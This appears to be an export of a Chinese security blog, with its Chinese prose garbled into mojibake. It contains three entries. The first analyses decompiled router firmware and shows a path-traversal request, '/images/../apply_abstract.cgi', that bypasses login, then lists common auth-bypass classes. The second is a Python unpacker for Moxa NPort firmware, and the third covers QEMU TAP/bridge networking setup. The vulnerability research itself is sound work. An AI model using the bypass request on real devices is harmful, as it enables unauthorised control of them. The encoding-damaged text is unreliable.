<p>å°† URL ä¼ å…¥ sub_DF50 å‡½æ•°ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_DF50</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  sub_167A8(url);</span><br><span class="line">  v2 = *url;</span><br><span class="line">  v3 = v2 == <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">    v3 = v2 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">528</span>; i += <span class="number">66</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_17584((maybe_post_handlers + i)) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = maybe_post_handlers + i;</span><br><span class="line">    v6 = <span class="built_in">strlen</span>((maybe_post_handlers + i));</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(url, v5, v6) &amp;&amp; (*(v5 + v6 - <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span> || v6 == <span class="built_in">strlen</span>(url) || url[v6] == <span class="string">&#x27;/&#x27;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_166D8(v6, url, (v5 + <span class="number">32</span>));</span><br><span class="line">      <span class="keyword">return</span> *(maybe_post_handlers + i + <span class="number">64</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_166D8(<span class="number">0</span>, url, dword_61648);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å†å°† URL ä¼ å…¥ sub_167A8ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_167A8</span><span class="params">(<span class="type">int</span> url)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// t1</span></span><br><span class="line"></span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  k = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(url + k) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( double_dot[j] == *(url + k) )          <span class="comment">// åˆ¤æ–­å½“å‰ä½ç½® url å­—ç¬¦æ˜¯å¦ä¸º .</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( double_dot[++j] )</span><br><span class="line">      &#123;</span><br><span class="line">        ++k;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (url + k + <span class="number">1</span>);                     <span class="comment">// æŒ‡å‘ .. ä¸‹ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">        v4 = *v3;                               <span class="comment">// è·å–å­—èŠ‚</span></span><br><span class="line">        v5 = v4 == <span class="string">&#x27;/&#x27;</span>;                         <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸º /</span></span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">          v5 = v4 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )                               <span class="comment">// å¦‚æœæ˜¯</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( k &lt;= <span class="number">3</span> || *(url + k - <span class="number">2</span>) == <span class="string">&#x27;/&#x27;</span> )<span class="comment">// å¦‚æœ url é•¿åº¦å°äºç­‰äº3ï¼Œæˆ–è€…å­˜åœ¨ /..</span></span><br><span class="line">          &#123;</span><br><span class="line">            v6 = k + <span class="number">1</span>;                         <span class="comment">// .. ä¸‹ä¸€ä¸ªä½ç½®</span></span><br><span class="line">            k -= <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">if</span> ( k &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( ; k &amp;&amp; *(url + k) != <span class="string">&#x27;/&#x27;</span>; --k )<span class="comment">// å€’é€€ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ª /</span></span><br><span class="line">                ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              k = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v7 = url + k;                       <span class="comment">// å¼€å¤´</span></span><br><span class="line">            v8 = *(url + v6);                   <span class="comment">// .. ä¸‹ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">            *(url + k) = v8;                    <span class="comment">// æ”¾åˆ°å¼€å¤´</span></span><br><span class="line">            <span class="keyword">if</span> ( v8 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                v9 = *++v3;                     <span class="comment">// æŠŠåç»­å­—èŠ‚æ‹·è´åˆ° url</span></span><br><span class="line">                *++v7 = v9;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">while</span> ( v9 );</span><br><span class="line">              j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( j &lt;= <span class="number">0</span> )                          <span class="comment">// å¦‚æœä¸æ˜¯ . ï¼ˆä¸”æ²¡é‡åˆ°è¿‡ .ï¼‰å°±é€’å¢åˆ° url ä¸‹ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      k += <span class="number">1</span> - j;</span><br><span class="line">      j = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç®€å•æ¥è®²ï¼Œæ­¤å‡½æ•°ä¼šå°†å½¢å¦‚ &#x2F;aaa&#x2F;..&#x2F;bbb è½¬æ¢æˆ &#x2F;bbbã€‚</p>
<p>è½¬æ¢ä¹‹åï¼Œå›åˆ° sub_DF50 å‡½æ•°ï¼Œå°† URL å’Œ maybe_post_handlers åˆ—è¡¨ä¸­å®šä¹‰çš„ handler æ¯”è¾ƒï¼Œå¦‚æœæ¯”è¾ƒæˆåŠŸï¼Œå°±å›åˆ° process_post ç”¨ exec_cgi_script æ‰§è¡Œå¯¹åº”çš„ handler å‡½æ•°ã€‚</p>
<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ &#x2F;images&#x2F;..&#x2F;apply_abstract.cgi ç±»ä¼¼çš„è¯·æ±‚ï¼Œç¨‹åºå…ˆåŒ¹é…åˆ° &#x2F;imagesï¼Œç»•è¿‡ç™»å½•ï¼Œç„¶åæ›¿æ¢ &#x2F;..&#x2F; å¯¼è‡´åç»­è®¿é—®çš„æ˜¯ &#x2F;apply_abstract.cgi æ¥å£ï¼Œå®ç°èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p>
<h3 id="å‚è€ƒé“¾æ¥-1"><a href="#å‚è€ƒé“¾æ¥-1" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a class="link"   href="https://zh-cn.tenable.com/security/research/tra-2021-13?tns_redirect=true" >https://zh-cn.tenable.com/security/research/tra-2021-13?tns_redirect=true<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>èº«ä»½éªŒè¯ç»•è¿‡æ˜¯ä¸€ç±»å½±å“æ¯”è¾ƒä¸¥é‡çš„æ¼æ´ï¼Œé€šè¿‡æ­¤ç±»æ¼æ´å¯å…è®¸æ”»å‡»è€…è®¿é—®åˆ°åå°æ›´å¤šæ•æ„Ÿæ¥å£ï¼Œé€šè¿‡ç»„åˆåˆ©ç”¨æ¼æ´å¯å®ç°å¯¹è®¾å¤‡çš„å®Œå…¨æ§åˆ¶ï¼Œä»æˆ‘ä»¬å¤ç°è¿‡çš„æ¼æ´æ¥çœ‹ï¼Œèº«ä»½éªŒè¯ç»•è¿‡åŸºæœ¬æœ‰ä»¥ä¸‹å‡ ç±»</p>
<ol>
<li>è®¾å¤‡çš„ç™»å½•åŠŸèƒ½å¯¹äºç”¨æˆ·å&#x2F;å¯†ç å¤„ç†ä¸æ°å½“ï¼Œæ”»å‡»è€…å¯é€šè¿‡ä¼ å…¥ç©ºå€¼&#x2F;ç¡¬ç¼–ç å€¼&#x2F;å¯æœ¬åœ°è®¡ç®—çš„å€¼æ¥é€šè¿‡éªŒè¯æµç¨‹ã€‚</li>
<li>è®¾å¤‡çš„ä¼šè¯ç®¡ç†å­˜åœ¨é—®é¢˜ï¼Œæ”»å‡»è€…é€šè¿‡æ§åˆ¶ Cookie å€¼ç»•è¿‡ä¼šè¯æ£€æŸ¥ã€‚</li>
<li>è®¾å¤‡å¯¹äºç”¨æˆ·è®¿é—®çš„èµ„æºè·¯å¾„å¤„ç†ä¸æ°å½“ï¼Œæ”»å‡»è€…é€šè¿‡è·¯å¾„ç©¿è¶Š&#x2F;æ’å…¥ç‰¹æ®Šå­—ç¬¦ä¸²ç­‰é€šè¿‡èº«ä»½éªŒè¯ï¼Œä½†å®é™…è®¿é—®åˆ°æ•æ„Ÿæ¥å£ã€‚</li>
<li>è®¾å¤‡åŒºåˆ†äº† PC å’Œ app è¯·æ±‚ï¼Œapp è¯·æ±‚å¯èƒ½å­˜åœ¨å¼±æ ¡éªŒã€‚</li>
<li>è®¾å¤‡ç›´æ¥æš´éœ²äº†æ•æ„Ÿæ¥å£ï¼Œæ”»å‡»è€…é€šè¿‡è®¿é—®è¿™äº›æ¥å£å¾—åˆ°è®¤è¯ä¿¡æ¯ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>Moxa Nport ç³»åˆ—è®¾å¤‡å›ºä»¶è§£åŒ…</title>
    <url>/2021/05/29/moxa-nport-unpack/</url>
    <content><![CDATA[<p>Moxa Nport è®¾å¤‡å›ºä»¶è§£åŒ…ã€‚</p>
<span id="more"></span>

<h2 id="å›ºä»¶æ ¼å¼"><a href="#å›ºä»¶æ ¼å¼" class="headerlink" title="å›ºä»¶æ ¼å¼"></a>å›ºä»¶æ ¼å¼</h2><p>å‰å››ä¸ªå­—èŠ‚ä¸º *FRMï¼Œç”¨äºè¯†åˆ«å›ºä»¶ã€‚å›ºä»¶å¤´éƒ¨å¤§å°ä¸º 0x160ï¼Œå†…éƒ¨åŒ…æ‹¬æ–‡ä»¶æ•°é‡ã€ä»£ç æ®µåç§»é‡ç­‰æ•°æ®ç»“æ„ï¼Œå¤´éƒ¨åé¢è·Ÿç€çš„æ˜¯æ–‡ä»¶è¡¨ï¼Œæ¯ä¸€ä¸ªæ¡ç›®å¤§å° 0x40ï¼ŒåŒ…æ‹¬æ–‡ä»¶åã€æ–‡ä»¶åç§»é‡ã€å¤§å°ç­‰ä¿¡æ¯ã€‚æœ€åæ˜¯ä»£ç æ®µã€‚</p>
<h2 id="è§£åŒ…è„šæœ¬"><a href="#è§£åŒ…è„šæœ¬" class="headerlink" title="è§£åŒ…è„šæœ¬"></a>è§£åŒ…è„šæœ¬</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: CataLpa</span></span><br><span class="line"><span class="comment"># Date: 2021-05-29</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filename, start_address, end_address, data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = <span class="built_in">open</span>(<span class="string">&quot;./unpacked/&quot;</span> + filename, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        i = start_address</span><br><span class="line">        temp_data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= end_address:</span><br><span class="line">            temp_data += data[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        t.write(temp_data)</span><br><span class="line">        t.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] No unpacked folder.&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> args.f:</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(args.f):</span><br><span class="line">            f = <span class="built_in">open</span>(args.f)</span><br><span class="line">            data = f.read()</span><br><span class="line">            f.close()</span><br><span class="line">            magic = data[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">if</span> magic != <span class="string">&quot;*FRM&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Not a valid firmware file.&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            header_length = <span class="number">0x160</span></span><br><span class="line">            code_offset = u32(data[<span class="number">0x54</span>:<span class="number">0x58</span>])</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Code offset: 0x%x&quot;</span> % code_offset)</span><br><span class="line">            table_length = u32(data[<span class="number">0xa2</span>:<span class="number">0xa4</span>].ljust(<span class="number">4</span>, <span class="string">&quot;\x00&quot;</span>))    <span class="comment"># Nport-5400</span></span><br><span class="line">            <span class="comment"># table_length = u32(data[0x9a:0x9c].ljust(4, &quot;\x00&quot;))  # Nport-5100</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] File: 0x%x&quot;</span> % table_length)</span><br><span class="line">            </span><br><span class="line">            i = header_length</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            filename = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> i &lt; header_length + (table_length * <span class="number">0x40</span>):</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">                filename = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">while</span> j &lt; <span class="number">0x30</span>:</span><br><span class="line">                    <span class="keyword">if</span> data[j + i] != <span class="string">&#x27;\x00&#x27;</span>:</span><br><span class="line">                        filename += data[j + i]</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">                j += <span class="number">8</span></span><br><span class="line">                length = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                j += <span class="number">4</span></span><br><span class="line">                start_address = u32(data[j + i] +  data[j + i + <span class="number">1</span>] + data[j + i + <span class="number">2</span>] + data[j + i + <span class="number">3</span>])</span><br><span class="line">                i += <span class="number">0x40</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] Extracting &quot;</span> + filename + <span class="string">&quot; ...&quot;</span>)</span><br><span class="line">                extractFile(filename, start_address + <span class="number">0x60</span>, start_address + <span class="number">0x60</span> + length, data)</span><br><span class="line">            binary = <span class="built_in">open</span>(<span class="string">&quot;binary.bin&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">            binary.write(data[code_offset:])</span><br><span class="line">            binary.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] No such file.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Use -h to get help.&quot;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>QEMU ç½‘ç»œé…ç½®ä¸€æŠŠæ¢­</title>
    <url>/2021/05/28/QEMU-networking/</url>
    <content><![CDATA[<p>å¦‚ä½•é…ç½® QEMU è™šæ‹Ÿæœºç½‘ç»œã€‚</p>
<span id="more"></span>

<h2 id="å…³äº-QEMU-çš„ç½‘ç»œç­–ç•¥"><a href="#å…³äº-QEMU-çš„ç½‘ç»œç­–ç•¥" class="headerlink" title="å…³äº QEMU çš„ç½‘ç»œç­–ç•¥"></a>å…³äº QEMU çš„ç½‘ç»œç­–ç•¥</h2><p>QEMU æä¾› 4 ç§ç½‘ç»œé€šä¿¡æ–¹æ³•ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p>
<ol>
<li>User mode stackï¼šç”¨æˆ·åè®®æ ˆæ–¹å¼ï¼Œè¿™ç§æ–¹å¼çš„å¤§æ¦‚åŸç†æ˜¯åœ¨ QEMU è¿›ç¨‹ä¸­å®ç°ä¸€ä¸ªåè®®æ ˆï¼Œè¿™ä¸ªåè®®æ ˆå¯ä»¥è¢«è§†ä¸ºä¸€ä¸ªä¸»æœºä¸è™šæ‹Ÿæœºä¹‹é—´çš„ NAT æœåŠ¡å™¨ï¼Œå®ƒè´Ÿè´£å°† QEMU æ‰€æ¨¡æ‹Ÿçš„ç³»ç»Ÿç½‘ç»œè¯·æ±‚è½¬å‘åˆ°å¤–éƒ¨ç½‘å¡ä¸Šé¢ï¼Œä»è€Œå®ç°ç½‘ç»œé€šä¿¡ã€‚ä½†æ˜¯ä¸èƒ½å°†å¤–é¢çš„è¯·æ±‚è½¬å‘åˆ°è™šæ‹Ÿæœºå†…éƒ¨ï¼Œå¹¶ä¸”è™šæ‹Ÿæœº VLAN ä¸­çš„æ¯ä¸ªæ¥å£å¿…é¡»æ”¾åœ¨ 10.0.2.0 å­ç½‘ä¸­ã€‚</li>
<li>socketï¼š ä¸º VLAN åˆ›å»ºå¥—æ¥å­—ï¼Œå¹¶æŠŠå¤šä¸ª VLAN è¿æ¥èµ·æ¥ã€‚</li>
<li>TAP&#x2F;bridgeï¼šæœ€é‡è¦çš„ä¸€ç§é€šä¿¡æ–¹å¼ï¼Œæˆ‘ä»¬æƒ³è¦å®ç° QEMU è™šæ‹Ÿæœºå’Œå¤–éƒ¨é€šä¿¡å°±éœ€è¦ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚</li>
<li>VDEï¼šä¹Ÿæ˜¯ç”¨äºè¿æ¥ VLAN çš„ï¼Œå¦‚æœæ²¡æœ‰ VLAN è¿æ¥éœ€æ±‚åŸºæœ¬ç”¨ä¸åˆ°ã€‚</li>
</ol>
<p>é‡ç‚¹è§£é‡Šä¸€ä¸‹ tap æ¨¡å¼ï¼ŒTAP å±äº LInux å†…æ ¸æ”¯æŒçš„ä¸€ç§è™šæ‹ŸåŒ–ç½‘ç»œè®¾å¤‡ï¼Œè¿˜æœ‰ TUN ä¹Ÿå±äºè¿™ç§è®¾å¤‡ï¼Œå®ƒä»¬å®Œå…¨ç”±è½¯ä»¶æ¨¡æ‹Ÿå®ç°ï¼ŒTUN&#x2F;TAP è´Ÿè´£åœ¨å†…æ ¸åè®®æ ˆå’Œç”¨æˆ·è¿›ç¨‹ä¹‹é—´ä¼ é€åè®®æ•°æ®å•å…ƒã€‚TUN å·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œè€Œ TAP å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚ï¼ŒTUN è´Ÿè´£ä¸åº”ç”¨ç¨‹åºäº¤æ¢ IP æ•°æ®åŒ…ï¼Œè€Œ TAP ä¸åº”ç”¨ç¨‹åºäº¤æ¢ä»¥å¤ªç½‘å¸§ã€‚æ‰€ä»¥ TUN ç»å¸¸æ¶‰åŠè·¯ç”±ï¼Œè€Œ TAP å¸¸ç”¨äºç½‘ç»œæ¡¥æ¥ã€‚</p>
<p>æ‰€è°“æ¡¥æ¥å¯ä»¥ç®€å•ç†è§£ä¸ºåœ¨ä¸¤å¼ ç½‘å¡ä¹‹é—´æ­ä¸€åº§æ¡¥ï¼Œä¸€ç«¯æœ‰æ•°æ®å°±å¯ä»¥é€šè¿‡æ¡¥èµ°åˆ°å¦ä¸€ç«¯ï¼Œå¯¹äºå®ç° QEMU è™šæ‹Ÿæœºé€šä¿¡æ­£åˆé€‚ã€‚æ¡¥æ¥æŠ€æœ¯åœ¨ VMWARE ä¸­éå¸¸å¸¸ç”¨ï¼Œæˆ‘ä»¬è®¾ç½®è™šæ‹Ÿæœºç½‘ç»œçš„æ—¶å€™å°±èƒ½çœ‹è§æ¡¥æ¥é€‰é¡¹ï¼Œå®é™…ä¸Š VMware åœ¨ç‰©ç†æœºä¸Šè™šæ‹ŸåŒ–äº† 3 å¼ ç½‘å¡ï¼Œåˆ†åˆ«è´Ÿè´£æ¡¥æ¥ã€ä»…ä¸»æœºã€å…±äº«ç½‘ç»œã€‚</p>
<h2 id="å…·ä½“çš„é…ç½®è¿‡ç¨‹"><a href="#å…·ä½“çš„é…ç½®è¿‡ç¨‹" class="headerlink" title="å…·ä½“çš„é…ç½®è¿‡ç¨‹"></a>å…·ä½“çš„é…ç½®è¿‡ç¨‹</h2><p>ï¼ˆ<strong>é¦–å…ˆç¡®å®šä½ çš„æœºå™¨æ”¯æŒ TAP&#x2F;TUN è™šæ‹Ÿè®¾å¤‡</strong>ï¼‰</p>
<p>é¦–å…ˆå®‰è£…å¦‚ä¸‹è½¯ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install bridge-utils        # è™šæ‹Ÿç½‘æ¡¥å·¥å…·</span><br><span class="line">apt-get install uml-utilities       # UMLï¼ˆUser-mode linuxï¼‰å·¥å…·</span><br></pre></td></tr></table></figure></div>

<p>æ·»åŠ ç½‘æ¡¥ï¼Œå¤§éƒ¨åˆ†æ“ä½œéƒ½éœ€è¦ root æƒé™ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig &lt;ä½ çš„ç½‘å¡åç§°(èƒ½ä¸Šç½‘çš„é‚£å¼ )&gt; down    # é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span><br><span class="line">brctl addbr br0                     # æ·»åŠ åä¸º br0 çš„ç½‘æ¡¥</span><br><span class="line">brctl addif br0 &lt;ä½ çš„ç½‘å¡åç§°&gt;        # åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span><br><span class="line">brctl stp br0 off                   # å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span><br><span class="line">brctl setfd br0 1                   # è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span><br><span class="line">brctl sethello br0 1                # è®¾ç½® br0 çš„ hello æ—¶é—´</span><br><span class="line">ifconfig br0 0.0.0.0 promisc up     # å¯ç”¨ br0 æ¥å£</span><br><span class="line">ifconfig &lt;ä½ çš„ç½‘å¡åç§°&gt; 0.0.0.0 promisc up    # å¯ç”¨ç½‘å¡æ¥å£</span><br><span class="line">dhclient br0                        # ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span><br><span class="line">brctl show br0                      # æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span><br><span class="line">brctl showstp br0                   # æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span><br></pre></td></tr></table></figure></div>

<p>å½“é…ç½®å®Œæˆä¹‹åæ‰§è¡Œ ifconfig ç»“æœåº”è¯¥å¦‚ä¸‹ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-2.png"
                     
                ></p>
<p>æ­¤æ—¶ç½‘æ¡¥å·²ç»å¾—åˆ°äº† IPï¼Œå¹¶ä¸”èƒ½å¤Ÿè¿æ¥ç½‘ç»œçš„ç½‘å¡ enp0s5 ä¹ŸåŠ å…¥äº†ç½‘æ¡¥ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„ç½‘æ¡¥çŠ¶æ€å¤§è‡´æ˜¯è¿™ç§æƒ…å†µ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-3.png"
                     
                ></p>
<p>æ¡¥çš„ä¸€ç«¯è¿æ¥åˆ° enp0s5ï¼Œæˆ‘ä»¬åªéœ€è¦å†æŠŠå¦ä¸€ç«¯æ¥åˆ° QEMU è™šæ‹Ÿæœº(å‡†ç¡®çš„è¯´æ˜¯ VLAN )ä¸Šé¢å°±å¯ä»¥äº†ã€‚</p>
<p>åˆ›å»ºä¸€ä¸ª TAP è®¾å¤‡ï¼Œä½œä¸º QEMU ä¸€ç«¯çš„æ¥å£ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t tap0 -u root              # åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span><br><span class="line">brctl addif br0 tap0                # åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><br><span class="line">ifconfig tap0 0.0.0.0 promisc up    # å¯ç”¨ tap0 æ¥å£</span><br><span class="line">brctl showstp br0                   # æ˜¾ç¤º br0 çš„å„ä¸ªæ¥å£</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶ç½‘æ¡¥çš„ä¿¡æ¯åº”è¯¥æ˜¯ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-4.png"
                     
                ></p>
<p>è¿™æ ·å°±ç›¸å½“äºæŠŠä¸¤å¼ ç½‘å¡é€šè¿‡ç½‘æ¡¥è¿èµ·æ¥äº†ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/QEMU-networking-5.png"
                     
                ></p>
<p>ç°åœ¨åªéœ€è¦å¯åŠ¨é•œåƒï¼ŒæŒ‡å®šç½‘ç»œè¿æ¥æ¨¡å¼æ˜¯ TAP å³å¯ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure></div>

<p>ç‰¹åˆ«è¯´æ˜ä¸€ä¸‹å‚æ•°å«ä¹‰ï¼š-net nic è¡¨ç¤ºå¸Œæœ› QEMU åœ¨è™šæ‹Ÿæœºä¸­åˆ›å»ºä¸€å¼ è™šæ‹Ÿç½‘å¡ï¼Œ-net tap è¡¨ç¤ºè¿æ¥ç±»å‹ä¸º TAPï¼Œå¹¶ä¸”æŒ‡å®šäº†ç½‘å¡æ¥å£åç§°(å°±æ˜¯åˆšæ‰åˆ›å»ºçš„ tap0ï¼Œç›¸å½“äºæŠŠè™šæ‹Ÿæœºæ¥å…¥ç½‘æ¡¥)ã€‚</p>
